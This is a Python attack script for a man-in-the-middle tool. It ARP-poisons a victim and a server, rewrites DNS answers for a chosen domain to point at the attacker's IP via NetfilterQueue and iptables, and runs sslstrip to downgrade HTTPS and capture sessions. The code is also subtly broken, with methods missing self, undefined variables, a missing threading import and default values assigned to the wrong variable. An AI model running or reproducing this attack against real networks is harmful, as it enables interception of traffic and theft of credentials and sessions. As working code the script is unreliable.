from scapy.all import *

from twisted.web import http
from twisted.internet import reactor
from netfilterqueue import NetfilterQueue

from sslstrip.StrippingProxy import StrippingProxy
from sslstrip.URLMonitor import URLMonitor
from sslstrip.CookieCleaner import CookieCleaner

import logging, os


class DefaultTool:
    def __init__(
        self, ip_victim, ip_server, ip_attacker, domain_to_spoof, network_interface
    ):
        self.ip_victim = ip_victim
        self.ip_attacker = ip_attacker
        self.ip_server = ip_server
        self.domain_to_spoof = domain_to_spoof
        self.network_interface = network_interface

    @staticmethod
    def get_mac_from_ip(ip):
        result, _ = arping(ip)
        for _, received in result:
            return received[Ether].src

    def inspect(packet):
        # from payload raw packet's to scapy packet
        pkt = IP(packet.get_payload())
        # if the packet is a DNS packet
        if DNS in pkt:
            # And if the domain = domain_to_spoff and DNS is a answer packet (has a DNSRR layer)
            if domain_to_spoof.lower() in str(pkt[DNS].qd.qname) and pkt.haslayer(
                DNSRR
            ):
                # pass to the spoof function
                pkt = spoof(pkt)
                # put back raw version of modified packet on payload
                packet.set_payload(bytes(pkt))
        # forward
        packet.accept()

    def spoof(pkt):
        # change the answer section to redirect domain_to_spoff to desired address
        pkt[DNS].an = DNSRR(
            rrname=pkt[DNS].qd.qname, type="A", ttl=604800, rdata=ip_attacker
        )
        # set the answer count to 1
        pkt[DNS].ancount = 1
        # modifying the packet will change its checksums and lenght
        # we simply delete those field for IP and UDP
        # scapy will recalculate new proper values automaticaly when calling bytes()
        del pkt[IP].chksum
        del pkt[UDP].chksum
        del pkt[IP].len
        del pkt[UDP].len

        return pkt

    def ssl_stripping(self):
        logFile = "sslstrip.log"
        logLevel = logging.WARNING  # or WARNING
        listenPort = 8080
        spoofFavicon = False
        killSessions = True

        logging.basicConfig(
            level=logLevel,
            format="%(asctime)s %(message)s",
            filename=logFile,
            filemode="w",
        )
        URLMonitor.getInstance().setFaviconSpoofing(spoofFavicon)
        CookieCleaner.getInstance().setEnabled(killSessions)
        strippingFactory = http.HTTPFactory(timeout=10)
        strippingFactory.protocol = StrippingProxy
        reactor.listenTCP(int(listenPort), strippingFactory)
        print("sslstrip based on Moxie's Marlinspike sslstrip running...")
        reactor.run()

    def arp_poisoning(self):
        while True:
            victim_mac = self.get_mac_from_ip(self.ip_victim)
            server_mac = self.get_mac_from_ip(self.ip_server)
            # getting self mac will throw exception if enp0s3 network interface does not exit
            attacker_mac = get_if_hwaddr(self.network_interface)

            victim_arp = Ether() / ARP()
            server_arp = Ether() / ARP()

            # Poison the victim's ARP table
            victim_arp[Ether].src = attacker_mac
            victim_arp[ARP].hwsrc = attacker_mac
            victim_arp[ARP].psrc = server_ip
            victim_arp[ARP].hwdst = victim_mac
            victim_arp[ARP].pdst = victim_ip
            print("poisoned victim arp table")
            sendp(victim_arp, iface=self.network_interface)

            # Poison the server's ARP table
            server_arp[Ether].src = attacker_mac
            server_arp[ARP].hwsrc = attacker_mac
            server_arp[ARP].psrc = victim_ip
            server_arp[ARP].hwdst = server_mac
            server_arp[ARP].pdst = server_ip
            print("poisoned server arp table")
            sendp(server_arp, iface=self.network_interface)

    def attack(self):
        # we need an iptables FORWARD rule
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

        nfqueue = NetfilterQueue()
        nfqueue.bind(0, inspect)

        try:
            print("running dns attack")
            nfqueue.run()

            print("running ssl stripping")
            self.ssl_stripping()
        except KeyboardInterrupt:
            # we need to clean the iptables rules else, shen done, we will stop forwarding
            os.system("iptables --flush")

    def run_attack(self):
        t1 = threading.Thread(target=self.arp_poisoning)
        t1.start()
        t2 = threading.Thread(target=self.attack)
        t2.start()

        # Run the threads indefinitely
        t1.join()
        t2.join()


ip_victim = input("enter IPv4 Address of the victim: ")
ip_server = input("enter IPv4 Address of the server: ")
ip_attacker = input("enter IPv4 Address of the attacker: ")
domain_to_spoof = input("enter domain you want to spoof: ")
network_interface = input("enter the network interface: ")

if ip_victim is None:
    ip_victim = "192.168.56.101"

if ip_server is None:
    ip_victim = "192.168.56.102"

if ip_attacker is None:
    ip_victim = "192.168.56.103"

if domain_to_spoof is None:
    domain_to_spoof = input("domain to spoof is required: ")

if network_interface is None:
    ip_victim = "enp0s3"

tool = DefaultTool(
    ip_victim, ip_server, ip_attacker, domain_to_spoof, network_interface
)
tool.run_attack()
